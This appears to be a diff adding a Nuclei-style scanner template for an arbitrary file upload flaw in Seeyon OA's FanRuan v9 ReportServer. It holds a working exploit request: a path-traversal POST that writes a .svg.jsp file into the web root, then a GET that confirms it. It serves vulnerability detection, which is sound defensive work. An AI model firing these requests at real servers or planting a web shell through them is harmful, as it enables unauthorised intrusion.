@@ -1,0 +1,35 @@
+id: seeyon-oa-ReportServer-upload
+
+info:
+  name: 致远OA帆软v9 ReportServer 任意文件上传漏洞
+  author: seeyon
+  severity: high
+  tags: seeyon
+
+http:
+  - raw:
+      - |
+        POST /seeyonreport/ReportServer?cmd=design_save_svg&filePath=chartmapsvg/../../../WebReport/{{randstr_1}}.svg.jsp&op=svginit HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        {"__CONTENT__":"{{randstr_2}}", "__CHARSET__": "UTF-8"}
+
+      - |+
+        GET /seeyonreport/WebReport/{{randstr_1}}.svg.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr_2}}'
+    matchers-condition: and
+
